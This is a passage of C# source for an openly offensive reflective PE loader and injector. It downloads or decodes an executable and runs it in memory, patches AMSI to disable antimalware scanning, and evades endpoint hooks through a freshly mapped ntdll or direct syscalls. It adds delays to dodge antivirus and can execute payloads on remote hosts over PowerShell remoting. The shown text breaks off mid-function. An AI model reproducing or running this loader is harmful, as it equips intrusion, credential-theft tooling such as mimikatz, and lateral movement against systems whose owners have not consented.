/*
Dynamic PE Reflective Loader/Injector for x86 and x64  
*/

using System;
using System.Runtime.InteropServices;
using System.IO;
using System.Collections.Generic;
using static DInvoke.Data.PE;
using static DInvoke.DynamicInvoke.Generic;
using DInvoke.ManualMap;
using System.Net;
using System.Linq;
using System.Diagnostics;
using System.Reflection;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Security.Principal;
using System.Threading;
using System.IO.Pipes;


void print(object input) { Console.WriteLine(input); }
void PrintExit(object input) { Console.WriteLine(input); Environment.Exit(0); } // useful for debuggin
void exit() { Environment.Exit(0); }

byte[] unpacked = new byte[] { };

string url = null;
string PE_b64 = null;
string fromfile = null;
string Args = "";
string ComputerName = null;
bool PatchExitProcs = false;
bool useSysCalls = false;
bool PSRemoting = false;
bool RedirectOutPut = false;
bool DisableLocalSuicide = false;

// -DisableForceExit
void ParseCLIArguments() // a DYI Parser XD
{
    void DisplayArgHelp()
    {
        Console.WriteLine("\n-url, -u          url to the binary to download");
        Console.WriteLine("\n-file, -f         full path to a binary to execute [useful when executing local PE on a remote machine]");
        Console.WriteLine("\n-b64PE            pass the entire PE as B64 encoded blob (if you are a mad person)");
        Console.WriteLine("\n-Args, -args, -a  Arguments to be passed to Exe [Optional]");
        Console.WriteLine("\n-patch_exit       Patch CorExit and ExitProcess to ExitThread [you know what is it if you need it XD]");
        Console.WriteLine("\n-syscalls         Instead of Mapping ntdll, will use dynamic syscalls [Hell's Gate Technique]");
        Console.WriteLine("\n-ComputerName     use powershell remoting to execute the PE on a target machine [Optional] (Retrieves output)");
        Console.WriteLine("\n-DisableForceExit Disable the 1.5 Minute Maximum Runtime Enforcement [Ex: if running interactive mimikatz]");
        Console.WriteLine("\n-help             Display this help screen.");
        Console.WriteLine("\n\nusage: .\\SharpReflectivePEInjection.exe -url http://10.10.10.10/exe.exe [Optional: -Args \"<EXE_ARGS>\"]");
        Console.WriteLine("usage: .\\SharpReflectivePEInjection.exe -b64PE <BASE64 PE_BLOB> [Optional: -Args \"<EXE_ARGS>\"]");
        Console.WriteLine("usage: .\\SharpReflectivePEInjection.exe -url http://10.10.10.10/exe.exe -ComputerName server.ad.local [Optional: -Args \"<EXE_ARGS>\"]");
    }

    if (args.Length == 0) { DisplayArgHelp(); Environment.Exit(0); }

    for (int arg = 0; arg < args.Length; arg++)
    {
        if (args[arg] == "-url" || args[arg] == "-u") { url = args[arg + 1]; }
        
        if (args[arg] == "-Args" ) { Args = args[arg + 1]; }
        if (args[arg] == "-args") { Args = args[arg + 1]; }
        if (args[arg] == "-a") { Args = args[arg + 1]; }

        if (args[arg] == "-b64PE") { PE_b64 = args[arg + 1]; }
        if (args[arg] == "-syscalls") { useSysCalls = true; }
        if (args[arg] == "-patch_exit") { PatchExitProcs = true; }
        if (args[arg] == "-help" || args[arg] == "-h" || args[arg] == "--help") { DisplayArgHelp(); Environment.Exit(0); }
        if (args[arg] == "-ComputerName") { PSRemoting = true; ComputerName = args[arg + 1];}
        if (args[arg] == "RedirectOutPut") { RedirectOutPut = true; } // this flag is for internal use only
        if (args[arg] == "-DisableForceExit") { DisableLocalSuicide = true; }
        if (args[arg] == "-file" || args[arg] == "-f") { fromfile = args[arg + 1]; }

    }
    

}

ParseCLIArguments();

// this function will run locally and the rest of the code will will be ran reflectively on remote target
// Gets the PE in whatever method the user specifies and always passes it to remote reflector in Base64 format
// allows for bypassing network based restrictions (ex: target machine can't reach the payload server to download the PE)
// allows for easily passing a local PE to remote machine using the (-file) argument
void PSRemotingReflection() 
{
    GetPE();
    
    string b64EXE = Convert.ToBase64String(unpacked);
    
    var filteredArgs = new List<string>(); // construct arguments for execution stub
    string[] CLI_ARGS = Environment.GetCommandLineArgs();
    for (int i = 1; i < CLI_ARGS.Length; i++)
    {
        if (CLI_ARGS[i] == "-url" || CLI_ARGS[i] == "-u") { filteredArgs.Add($"\"-b64PE\""); filteredArgs.Add($"\"{b64EXE}\""); print("[*] Passed binary to remote reflector"); }
        if (CLI_ARGS[i] == "-file" || CLI_ARGS[i] == "-f" ) { filteredArgs.Add($"\"-b64PE\""); filteredArgs.Add($"\"{b64EXE}\""); print("[*] Passed binary to remote reflector"); }

        if (!CLI_ARGS[i].Contains("ComputerName") && CLI_ARGS[i] != ComputerName) { filteredArgs.Add($"\"{CLI_ARGS[i]}\""); }


    }
    filteredArgs.Add("\"RedirectOutPut\""); // this will trigger stdout and stderr redirection so output can be retrieved remotely

    string psArgs = string.Join(",", filteredArgs);
    psArgs = $"({psArgs})";

    if (!string.IsNullOrEmpty(url))
    {
        psArgs = psArgs.Replace(url, null);
        psArgs = psArgs.Replace("-url", null);
        psArgs = psArgs.Replace("-u", null);
    }
    if (!string.IsNullOrEmpty(fromfile))
    {
        psArgs = psArgs.Replace(fromfile, null);
        psArgs = psArgs.Replace("-file", null);
        psArgs = psArgs.Replace("-f", null);
    }
    
    //PrintExit(psArgs);
    print("[*] Constructed arguments to be passed with powershell remoting");
   
    
    Assembly currentAssembly = Assembly.GetExecutingAssembly(); //get the currently running assembly's bytes
    string assemblyLocation = currentAssembly.Location;
    byte[] assemblyBytes;
    string b64ASM;
    using (FileStream fileStream = new FileStream(assemblyLocation, FileMode.Open, FileAccess.Read))
    {
        using (BinaryReader binaryReader = new BinaryReader(fileStream))
        {
            assemblyBytes = binaryReader.ReadBytes((int)fileStream.Length);
            print("[*] Retrieved Current Assembly Bytes");

            b64ASM = Convert.ToBase64String(assemblyBytes);
        }
    }

    
    // (Nasty oneliner) XD
    string powerhsell_script = $"$object = [System.Reflection.Assembly]::Load([Convert]::FromBase64String(\"{b64ASM}\")); $bindingFlags = [Reflection.BindingFlags]\"Public,NonPublic,Static\"; $type=$object.GetType(\"Program\");$method = $type.GetMethod(\"<Main>$\",$bindingFlags);$method.Invoke($null, (, [string[]] {psArgs}) ) ";

    print("[*] Constructed a powershell oneliner");

    //PrintExit(powerhsell_script);
    // opening a remote WinRM connection with current user context
    
    Uri WsmanUri = new Uri($"http://{ComputerName}:5985/wsman");
    WSManConnectionInfo RemoteWinRM = null; 
    WindowsIdentity CurrentUser = WindowsIdentity.GetCurrent();
    if (CurrentUser != null)
    {
        string user = CurrentUser.Name;
        print($"[+] Identity Context: {user}");

        PSCredential creds = new(user); 

        RemoteWinRM = new(WsmanUri);
        RemoteWinRM.Credential = creds;
        
    }
    else { print("[-] couldn't find an identity to use with PSRemoting"); }

    // open a remote powershell unmanaged runspace
    
    using (Runspace UnManagedRunSpace = RunspaceFactory.CreateRunspace(RemoteWinRM))
    {
        UnManagedRunSpace.Open(); // open the unmanaged runspace
        print("[*] opened a remote powershell runspace (unmanaged)");
        using (PowerShell pwsh = PowerShell.Create())
        {
            

            pwsh.Runspace = UnManagedRunSpace; 
            pwsh.AddScript(powerhsell_script).AddCommand("Out-String");


            print("[+] Suicide Burn before remote Invokation ...."); // this trick is from BetterSafetyKatz repo ;)
            Thread.Sleep(3268); // thats just a random number i clicked XD
            print("[*] Invoking stub in the remote runspace");

            Thread tstdout = new Thread(() => { ReadStdOut(ComputerName); });
            Thread tstderr = new Thread(() => { ReadStdErr(ComputerName); });

            tstdout.Start();
            tstderr.Start();

            try { pwsh.Invoke(); } catch { /* me if you can ;) */ }

            
            Process.GetCurrentProcess().Kill(); // kill the current process directly after output to avoid endless execution loops
        }

    }

}

void ReadStdOut(string ComputerName) 
{
    Console.WriteLine("[+] starting STDOUT remote reader pipe client");
    string pipeName = "stdout";

    using (NamedPipeClientStream pipeClient = new NamedPipeClientStream(ComputerName, pipeName, PipeDirection.In, PipeOptions.None, TokenImpersonationLevel.Impersonation))
    {
        pipeClient.Connect();
        using (StreamReader reader = new StreamReader(pipeClient))
        {
            string line;
            if ((line = reader.ReadLine()) == null) { Console.WriteLine("[i] did not receive any data on stdout pipe"); }
            while ((line = reader.ReadLine()) != null)
            {
                Console.WriteLine(line);
            }
        }
        Process.GetCurrentProcess().Dispose();
        Process.GetCurrentProcess().Kill(); // killing immediatly after read so it doesn't bug out
    }
}
/* (ReadStd*) functions are made to read redirected stdout and stderr when executing PEs remotely*/
void ReadStdErr(string ComputerName)
{
    Console.WriteLine("[+] starting STDERR remote reader pipe client");
    string pipeName = "stderr";
    using (NamedPipeClientStream pipeClient = new NamedPipeClientStream(ComputerName, pipeName, PipeDirection.In, PipeOptions.None,
                    TokenImpersonationLevel.Impersonation))
    {
        pipeClient.Connect();
        using (StreamReader reader = new StreamReader(pipeClient))
        {
            string line;
            int counter = 0;
            while ((line = reader.ReadLine()) != null)
            {
                Console.WriteLine(line);
                counter++;
                if (counter == 10) { break; }
            }
        }
        Console.WriteLine("[+] Disposing all resources and killing the process");
        Console.WriteLine("[*] Suicide Will Take Care of Remote Cleanup (if there is any)");
        Process.GetCurrentProcess().Dispose();
        Process.GetCurrentProcess().Kill(); // killing immediatly after read so it doesn't bug out

    }
}



if (PSRemoting) { PSRemotingReflection(); } // calls itself reflectively on a remote machine without setting PSremoting true again


void GetPE()
{

    if (string.IsNullOrEmpty(url) && !string.IsNullOrEmpty(PE_b64)) // base64 encoding
    {
        print("[*] unpacking binary from base64 blob");
        unpacked = Convert.FromBase64String(PE_b64);
    }


    if (string.IsNullOrEmpty(url) && string.IsNullOrEmpty(PE_b64) &&  !string.IsNullOrEmpty(fromfile)) { // get from local file
        print("[*] Reading Binary From File");
        unpacked = File.ReadAllBytes(fromfile);
    }

    if (string.IsNullOrEmpty(PE_b64) && !string.IsNullOrEmpty(url)) // download from a url
    {
        using (WebClient downloadPE = new WebClient())
        {
            Console.WriteLine($"[*] Downloading PE from {url}");
            unpacked = downloadPE.DownloadData(url);


        }
    }
}
GetPE();
if (string.IsNullOrEmpty(url) && string.IsNullOrEmpty(PE_b64) && string.IsNullOrEmpty(fromfile))
{
    print("usage: .\\SharpReflectivePEInjection.exe -url http://10.10.10.10/exe.exe [Optional: -Args \"<EXE_ARGS>\"]");
    print("usage: .\\SharpReflectivePEInjection.exe -b64PE <BASE64 PE_BLOB> [Optional: -Args \"<EXE_ARGS>\"]");
    print("usage: .\\SharpReflectivePEInjection.exe -url http://10.10.10.10/exe.exe -ComputerName server.ad.local [Optional: -Args \"<EXE_ARGS>\"]");
    print("\nfor full help: .\\SharpReflectivePEInjection.exe -h ");
    exit();
}



// mapping DLLs
PE_MANUAL_MAP ntdll = new();
if (!useSysCalls)
{
    ntdll = Map.MapModuleToMemory(@"C:\Windows\System32\ntdll.dll");
    Console.WriteLine("[*] Mapped a clean version of ntdll (no hooks here)");
}
else { print("[*] using SysCalls, Will Not Map ntdll"); }



// NtAllocate
IntPtr ntva_ptr;
if (useSysCalls) { ntva_ptr = GetSyscallStub("NtAllocateVirtualMemory"); } else { ntva_ptr = GetExportAddress(ntdll.ModuleBase, "NtAllocateVirtualMemory"); }
NtAllocateVirtualMemory NtAllocateVirtualMemory = Marshal.GetDelegateForFunctionPointer<NtAllocateVirtualMemory>(ntva_ptr);
//

//NtProtect (the only way i was able to get it to work)
IntPtr ntvp_ptr;
if (useSysCalls) { ntvp_ptr = GetSyscallStub("NtProtectVirtualMemory"); } else { ntvp_ptr = GetExportAddress(ntdll.ModuleBase, "NtProtectVirtualMemory"); }
object NtProtectVirtualMemory(IntPtr pHandle, IntPtr Address, IntPtr NtSize, uint AccessMask, uint OldProtection)
{
    object[] NtVPArgs = { pHandle, Address, NtSize, AccessMask, OldProtection };
    return DynamicFunctionInvoke(ntvp_ptr, typeof(NtProtectVirtualMemory), ref NtVPArgs);
}
//

// NtFree
IntPtr ntvf_ptr;
if (useSysCalls) { ntvf_ptr = GetSyscallStub("NtFreeVirtualMemory"); } else { ntvf_ptr = GetExportAddress(ntdll.ModuleBase, "NtFreeVirtualMemory"); }
NtFreeVirtualMemory NtFreeVirtualMemory = Marshal.GetDelegateForFunctionPointer<NtFreeVirtualMemory>(ntvf_ptr);
//

// NtCreateThreadEx
IntPtr ntct_ptr;
if (useSysCalls) { ntct_ptr = GetSyscallStub("NtCreateThreadEx"); } else { ntct_ptr = GetExportAddress(ntdll.ModuleBase, "NtCreateThreadEx"); }
NtCreateThreadEx NtCreateThreadEx = Marshal.GetDelegateForFunctionPointer<NtCreateThreadEx>(ntct_ptr);
//

// NtClose
IntPtr ntc;
if (useSysCalls) { ntc = GetSyscallStub("NtClose"); } else { ntc = GetExportAddress(ntdll.ModuleBase, "NtClose"); }
NtClose NtClose = Marshal.GetDelegateForFunctionPointer<NtClose>(ntc);
//

//NtWaitForSingleObject
IntPtr NtWait; // direct syscall made easy XD, i fuckin love D/Invoke
if (useSysCalls) { NtWait = GetSyscallStub("NtWaitForSingleObject"); } else { NtWait = GetExportAddress(ntdll.ModuleBase, "NtWaitForSingleObject"); }
NtWaitForSingleObject NtWaitForSingleObject = Marshal.GetDelegateForFunctionPointer<NtWaitForSingleObject>(NtWait);

//kernelbase.dll functions
IntPtr SetStdptr = GetLibraryAddress("kernelbase.dll", "SetStdHandle", true);
SetStdHandle SetStdHandle = Marshal.GetDelegateForFunctionPointer<SetStdHandle>(SetStdptr);

IntPtr HandleInfoptr = GetLibraryAddress("kernelbase.dll", "SetHandleInformation", true); ;
SetHandleInformation SetHandleInformation = Marshal.GetDelegateForFunctionPointer<SetHandleInformation>(HandleInfoptr);
//

// constants
const uint MEM_COMMIT = 0x1000;
const uint PAGE_EXECUTE_READWRITE = 0x40;
const uint PAGE_EXECUTEREAD = 0x20;
const uint PAGE_READWRITE = 0x04;
const uint THREAD_ALL_ACCESS = 0x1FFFFF;
//


void AmziPatcher()
{ // patching A.M.S.I, //will add AES decryption routine to obfuscate the names

    try
    {
        uint OldProtection = 0;


        IntPtr func = GetLibraryAddress("a"+"m"+"s"+"i"+".dll", "A"+"m"+"s"+"i"+"S"+"c"+"a"+"n"+"B"+"u"+"f"+"f"+"e"+"r", true);
        
        // return arch appropriat patch, patch from rasta mouse
        byte[] patch = IntPtr.Size == 8 ? new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 } : new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };

        IntPtr NtPatchSize = new IntPtr(patch.Length);

        _ = NtProtectVirtualMemory(new IntPtr(-1),  func, NtPatchSize, PAGE_READWRITE, OldProtection);

        Marshal.Copy(patch, 0, func, patch.Length);
        print("[*] Patched A.M.Z.I!");
        _ = NtProtectVirtualMemory(new IntPtr(-1), func, NtPatchSize, OldProtection, OldProtection);
    }
    catch {/* pokemon */}

}
AmziPatcher();


IMAGE_DOS_HEADER dosHeader = new();
IMAGE_OPTIONAL_HEADER64 OptionalHeader64 = new();
IMAGE_OPTIONAL_HEADER32 OptionalHeader32 = new();
IMAGE_FILE_HEADER FileHeader = new();
IMAGE_SECTION_HEADER[] ImageSectionHeaders;
bool Is32bitPE = false;



// CaseySmith's PELoader Constructor, but modified to DInvoke
using (MemoryStream stream = new MemoryStream(unpacked, 0, unpacked.Length))
{
    BinaryReader reader = new BinaryReader(stream);
    dosHeader = FromBinaryReader<IMAGE_DOS_HEADER>(reader);

    // Add 4 bytes to the offset
    stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);

    UInt32 ntHeadersSignature = reader.ReadUInt32();
    FileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);

    UInt16 IMAGE_FILE_32BIT_MACHINE = 0x0100;
    bool Is32BitHeader = (IMAGE_FILE_32BIT_MACHINE & FileHeader.Characteristics) == IMAGE_FILE_32BIT_MACHINE;

    if (Is32BitHeader)
    {
        OptionalHeader32 = FromBinaryReader<IMAGE_OPTIONAL_HEADER32>(reader);
        Is32bitPE = true;
    }
    else
    {
        OptionalHeader64 = FromBinaryReader<IMAGE_OPTIONAL_HEADER64>(reader);
    }

    ImageSectionHeaders = new IMAGE_SECTION_HEADER[FileHeader.NumberOfSections];
    for (int headerNo = 0; headerNo < ImageSectionHeaders.Length; ++headerNo)
    {
        ImageSectionHeaders[headerNo] = FromBinaryReader<IMAGE_SECTION_HEADER>(reader);
    }

    // after populating close and dispose all memory resources of BinaryReader
    reader.Dispose();
    reader.Close();



}
static T FromBinaryReader<T>(BinaryReader reader) // CaseySmith's PELoader FromBinaryReader Method
{
    
    byte[] bytes = reader.ReadBytes(Marshal.SizeOf(typeof(T)));
    
    GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
    T theStructure = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
    handle.Free();

    return theStructure;
}

if (Is32bitPE)
{

    print("[*] Loading 32-bit PE, x86 memory layout will apply");
}
else
{
    print("[*] Loading 64-bit PE, x64 memory layout will apply");
}


uint SizeOfImage = Is32bitPE == true ? OptionalHeader32.SizeOfImage : OptionalHeader64.SizeOfImage;
IntPtr NtSizeOfImage = new IntPtr(SizeOfImage);
IntPtr CurrentProcessHandle = (IntPtr)(-1);

IntPtr codebase = IntPtr.Zero;

NtAllocateVirtualMemory((IntPtr)(-1), ref codebase, IntPtr.Zero, ref NtSizeOfImage, MEM_COMMIT, PAGE_READWRITE);




// Copy Sections
for (int SectionIndex = 0; SectionIndex < FileHeader.NumberOfSections; SectionIndex++)
{

    IntPtr SectionAddress = IntPtr.Add(codebase, (int)ImageSectionHeaders[SectionIndex].VirtualAddress);
    uint SectionSize = ImageSectionHeaders[SectionIndex].SizeOfRawData;
    IntPtr NtSectionSize = new IntPtr(SectionSize);
    if (SectionSize != 0)
    {
        NtAllocateVirtualMemory(CurrentProcessHandle, ref SectionAddress, IntPtr.Zero, ref NtSectionSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        Marshal.Copy(unpacked, (int)ImageSectionHeaders[SectionIndex].PointerToRawData, SectionAddress, (int)SectionSize);
    }
    else continue;
}
print("[*] Mapped Sections"); // if there is any errors its mostly comming from here, its not always DNS, its always Relocations :\



// relocations

var ImageBase = Is32bitPE == true ? OptionalHeader32.ImageBase : OptionalHeader64.ImageBase;
var delta = Is32bitPE == true ? codebase.ToInt32() - (int)ImageBase : codebase.ToInt64() - (long)ImageBase;
var BaseRelocationRVA = Is32bitPE == true ? OptionalHeader32.BaseRelocationTable.VirtualAddress : OptionalHeader64.BaseRelocationTable.VirtualAddress;


IntPtr RelocationTablePtr = IntPtr.Add(codebase, (int)BaseRelocationRVA);
IMAGE_BASE_RELOCATION ImageBaseRelocation = new();
ImageBaseRelocation = Marshal.PtrToStructure<IMAGE_BASE_RELOCATION>(RelocationTablePtr);
int ImageSizeOfBaseRelocation = Marshal.SizeOf<IMAGE_BASE_RELOCATION>();
int SizeOfRelocationBlock = (int)ImageBaseRelocation.SizeOfBlock;
IntPtr pRelocationTablePtr = RelocationTablePtr; // using a pointer to a pointer ??? --__('')__--

while (true)
{
    IMAGE_BASE_RELOCATION ImageBaseRelocation2 = new();
    IntPtr NextRelocationBlock = IntPtr.Add(RelocationTablePtr, SizeOfRelocationBlock);
    ImageBaseRelocation2 = Marshal.PtrToStructure<IMAGE_BASE_RELOCATION>(NextRelocationBlock);

    IntPtr RelocationBlockAddress = IntPtr.Add(codebase, (int)ImageBaseRelocation.VirtualAdress);
    int RelocationEntriesinBlock = (int)((ImageBaseRelocation.SizeOfBlock - ImageSizeOfBaseRelocation) / 2);

    for (int i = 0; i < RelocationEntriesinBlock; i++)
    {
        UInt16 RelocationEntry = (UInt16)Marshal.ReadInt16(pRelocationTablePtr, ImageSizeOfBaseRelocation + (2 * i));
        UInt16 type = (UInt16)(RelocationEntry >> 12);
        UInt16 AddressToFix = (UInt16)(RelocationEntry & 0xfff);
        switch (type)
        {
            case 0x0:
                break;
            case 0xA: // PE32+
                IntPtr PatchAddress = IntPtr.Add(RelocationBlockAddress, AddressToFix);
                long OriginalAddress = Marshal.ReadInt64(PatchAddress);
                Marshal.WriteInt64(PatchAddress, OriginalAddress + delta);
                break;

            case 0x3: // PE32
                IntPtr PatchAddress32 = IntPtr.Add(RelocationBlockAddress, AddressToFix);
                int OriginalAddress32 = Marshal.ReadInt32(PatchAddress32);
                Marshal.WriteInt32(PatchAddress32, OriginalAddress32 + (int)delta);
                break;
        }

    }
    pRelocationTablePtr = IntPtr.Add(RelocationTablePtr, SizeOfRelocationBlock);
    SizeOfRelocationBlock += (int)ImageBaseRelocation2.SizeOfBlock;
    ImageBaseRelocation = ImageBaseRelocation2;

    if (ImageBaseRelocation2.SizeOfBlock == 0) break;
}
print("[*] Performed Relocations");



// Resolving Imports, Dancing in the IAT 



int IMBORT_DIRECTORY_TABLE_ENTRY_LENGTH = 20;
int IDT_IAT_OFFSET = 16;
int DLL_NAME_RVA_OFFSET = 12;
int IMPORT_LOOKUP_TABLE_HINT = 2;

var IMPORT_TABLE_SIZE = Is32bitPE == true ? (int)OptionalHeader32.ImportTable.Size : (long)OptionalHeader64.ImportTable.Size;
int ImportTableRVA = Is32bitPE == true ? (int)OptionalHeader32.ImportTable.VirtualAddress : (int)OptionalHeader64.ImportTable.VirtualAddress;

int SizeOfImportDescriptorStruct = Marshal.SizeOf<DInvoke.Data.Win32.Kernel32.IMAGE_IMPORT_DESCRIPTOR>();
var NumberOfDlls = IMPORT_TABLE_SIZE / SizeOfImportDescriptorStruct;

IntPtr pIDT = IntPtr.Add(codebase, ImportTableRVA);

for (int DllIndex = 0; DllIndex < NumberOfDlls; DllIndex++)
{
    IntPtr pImageImportDescriptor = IntPtr.Add(pIDT, IMBORT_DIRECTORY_TABLE_ENTRY_LENGTH * DllIndex);
    IntPtr dllNameRva = IntPtr.Add(pImageImportDescriptor, DLL_NAME_RVA_OFFSET);
    IntPtr dllNamePtr = IntPtr.Add(codebase, Marshal.ReadInt32(dllNameRva));
    string DllName = Marshal.PtrToStringAnsi(dllNamePtr);
    if (string.IsNullOrEmpty(DllName)) { break; }
    IntPtr Handle2Dll;
    //if (DllName.ToLower() == "kernel32.dll") { Handle2Dll = kernel32.ModuleBase; } // if the loaded PE uses kernel32, it will use the mapped clean version
    if (DllName.ToLower() == "ntdll.dll") { Handle2Dll = ntdll.ModuleBase; } // same here for ntdll
    Handle2Dll = LoadModuleFromDisk(DllName); // LdrLoadDll
    Console.Write($"\r[+] slowly loading DLLs: {DllName}  \r");
    Console.Write("\r");

    int IAT_RVA = Marshal.ReadInt32(pImageImportDescriptor, IDT_IAT_OFFSET);
    IntPtr IATPtr = IntPtr.Add(codebase, IAT_RVA);

    while (true)
    {
        IntPtr DllFuncNamePtr = IntPtr.Add(codebase, Marshal.ReadInt32(IATPtr) + IMPORT_LOOKUP_TABLE_HINT);
        string DllFuncName = Marshal.PtrToStringAnsi(DllFuncNamePtr);
        if (string.IsNullOrEmpty(DllFuncName)) { break; } // sanity 
        IntPtr FuncAddress= GetNativeExportAddress(Handle2Dll, DllFuncName); // LdrGetProcedureAddress
        var IntFunctionAddress = Is32bitPE == true ? FuncAddress.ToInt32() : FuncAddress.ToInt64();
        if (Is32bitPE)
        {
            Marshal.WriteInt32(IATPtr, (int)IntFunctionAddress);

        }
        else
        {
            Marshal.WriteInt64(IATPtr, (long)IntFunctionAddress);
        }

        IATPtr = IntPtr.Add(IATPtr, IntPtr.Size);
        Thread.Sleep(31); // slowing down to not trigger AV
    }
    

}
print("[*] Loaded Dlls and Fixed Import Access Table");


// cmdline hijacking

string ExeArgs = $" {Args}"; // needs a white space prefix
if (!string.IsNullOrEmpty(Args)) { print($"[*] Passing [{Args}] to EXE"); }
void PatchGetCommandLineX() // reference Invoke-ReflectivePEinjection.ps1, Lines: 1966 - 2125
{
    int PtrSize = IntPtr.Size; // 32Bit=4, 64bit=8

    IntPtr hKernelBase = GetPebLdrModuleEntry("kernelbase.dll");

    IntPtr CLIWptr = Marshal.StringToHGlobalUni(ExeArgs); 
    IntPtr CLIAptr = Marshal.StringToHGlobalAnsi(ExeArgs);  

    // GetCommandLineA address from kernelbase.dll
    IntPtr GetCommandLineAaddr = GetExportAddress(hKernelBase, "GetCommandLineA");
    
    // GetCommandLineW address from kernelbase.dll
    IntPtr GetCommandLineWaddr = GetExportAddress(hKernelBase, "GetCommandLineW");

    byte[] AssemblyPatch;

    if (!Is32bitPE)
    {
     
        AssemblyPatch = new byte[] { 0x48, 0xb8 }; // MOV REX.W // prepares the cpu for x64 instructions
    }
    else
    {
        AssemblyPatch = new byte[] { 0xb8 }; // MOV, if x86
    }

    byte[] RET = { 0xc3 };

    uint TotalSize;
    TotalSize = (uint)(AssemblyPatch.Length + PtrSize + RET.Length);

    IntPtr NtTotalSize = new IntPtr(TotalSize);
    uint OldProtection = 0;

    byte[] Nulls = new byte[TotalSize];
    for (int i = 0; i < Nulls.Length; i++) { Nulls[i] += 0x00; }

    // overwriting GetCommandLineA

    NtProtectVirtualMemory(new IntPtr(-1), GetCommandLineAaddr, NtTotalSize, PAGE_READWRITE, OldProtection);

    Marshal.Copy(Nulls.ToArray(), 0, GetCommandLineAaddr, Nulls.Length);

    Marshal.Copy(AssemblyPatch, 0, GetCommandLineAaddr, AssemblyPatch.Length);
    GetCommandLineAaddr = IntPtr.Add(GetCommandLineAaddr, AssemblyPatch.Length);
    Marshal.StructureToPtr(CLIAptr, GetCommandLineAaddr, true); // puts the CLIAptr string in GetCommandLineAptr memory address
    GetCommandLineAaddr = IntPtr.Add(GetCommandLineAaddr, PtrSize);
    Marshal.Copy(RET, 0, GetCommandLineAaddr, RET.Length);

    NtProtectVirtualMemory(new IntPtr(-1), GetCommandLineAaddr, NtTotalSize, PAGE_EXECUTEREAD, OldProtection);

    Thread.Sleep(20);
    
    // overwriting GetCommandLineW

    NtProtectVirtualMemory(new IntPtr(-1), GetCommandLineWaddr, NtTotalSize, PAGE_READWRITE, OldProtection);

    Marshal.Copy(Nulls.ToArray(), 0, GetCommandLineWaddr, Nulls.Length);

    Marshal.Copy(AssemblyPatch, 0, GetCommandLineWaddr, AssemblyPatch.Length);
    GetCommandLineWaddr = IntPtr.Add(GetCommandLineWaddr, AssemblyPatch.Length);
    Marshal.StructureToPtr(CLIWptr, GetCommandLineWaddr, true); // puts the CLIAptr string in GetCommandLineAptr memory address
    GetCommandLineWaddr = IntPtr.Add(GetCommandLineWaddr, PtrSize);
    Marshal.Copy(RET, 0, GetCommandLineWaddr, RET.Length);

    NtProtectVirtualMemory(new IntPtr(-1), GetCommandLineWaddr, NtTotalSize, PAGE_EXECUTEREAD, OldProtection);

    Thread.Sleep(20);

    if (!string.IsNullOrEmpty(ExeArgs)) { print("[*] Patched args !"); }

    NtClose(hKernelBase);
    Marshal.FreeHGlobal(CLIAptr);
    Marshal.FreeHGlobal(CLIWptr);

}

void Patch_xcmdln() // adding support to Native C/C++ args like (argv[0]) to make it fully compatible with anything
{

    uint OldProtect;
    uint NtOld = 0;

    IntPtr hDll = GetPebLdrModuleEntry("msvcrt.dll"); // without using DInvoke and Native C# structures to acces the PEB it won't work
    if (hDll == IntPtr.Zero) { print("[-] could not load msvcrt.dll, non windows api args will not be patched"); }
    IntPtr Wcmdlineaddr = GetExportAddress(hDll, "_wcmdln");
    IntPtr Acmdlineaddr = GetExportAddress(hDll, "_acmdln");

    IntPtr NewPtra_cmdln = Marshal.StringToHGlobalAnsi(ExeArgs);
    IntPtr NewPtrw_cmdln = Marshal.StringToHGlobalAnsi(ExeArgs);

    IntPtr NtSize = new IntPtr(IntPtr.Size);

    // patch a_cmdln

    NtProtectVirtualMemory((IntPtr)(-1), Acmdlineaddr, NtSize, PAGE_READWRITE, NtOld);
    Marshal.StructureToPtr(NewPtra_cmdln, Acmdlineaddr, true);
    NtProtectVirtualMemory((IntPtr)(-1), Acmdlineaddr, NtSize, NtOld, NtOld);

    // patch W_cmdln

    NtProtectVirtualMemory((IntPtr)(-1), Acmdlineaddr, NtSize, PAGE_READWRITE, NtOld);
    Marshal.StructureToPtr(NewPtrw_cmdln, Wcmdlineaddr, true);
    NtProtectVirtualMemory((IntPtr)(-1), Acmdlineaddr, NtSize, NtOld, NtOld);


    NtClose(hDll);

    Marshal.FreeHGlobal(NewPtra_cmdln);
    Marshal.FreeHGlobal(NewPtrw_cmdln);

}




void PatchExit() // guess what, YEP referencing Invoke-ReflectivePEInjection.ps1 again, these people are awesome!!!
{
    print("[*] Patching Exit mechanism to ExitThread");

    var ExitFunctions = new List<IntPtr>();

    IntPtr hMscoree = GetPebLdrModuleEntry("mscoree.dll");
    if (hMscoree == IntPtr.Zero) { print("did not find mscoree.dll"); }
    IntPtr hkernel32 = GetPebLdrModuleEntry("kernel32.dll");
    if (hkernel32 == IntPtr.Zero) { print("did not find kernel32.dll, WTF kind of windows doesn't have kernel32"); }

    IntPtr CorExitProcaddr = GetExportAddress(hMscoree, "CorExitProcess");
    IntPtr ExitProcAddr = GetExportAddress(hkernel32, "ExitProcess");
    if (ExitProcAddr == IntPtr.Zero) { print("did not find ExitProcess"); }



    ExitFunctions.Add(CorExitProcaddr);
    ExitFunctions.Add(ExitProcAddr);


    uint OldProtection = 0;

    foreach (IntPtr Function in ExitFunctions)
    {

        IntPtr FunctionAddr = Function;
        byte[] AssemblyPatch;
        byte[] AssemblyPatch2;

        if (Is32bitPE) // x86 assembly to patch
        {
            AssemblyPatch = new byte[] { 0xbb };
            AssemblyPatch2 = new byte[] { 0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb };
        }
        else // guess it 
        {
            AssemblyPatch = new byte[] { 0x48, 0xbb };
            AssemblyPatch2 = new byte[] { 0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb };

        }

        byte[] CALL_MODRM = { 0xff, 0xd3 };

        int TotalSize = AssemblyPatch.Length + IntPtr.Size + AssemblyPatch2.Length + IntPtr.Size + CALL_MODRM.Length;
        IntPtr NtTotalSize = new IntPtr(TotalSize);

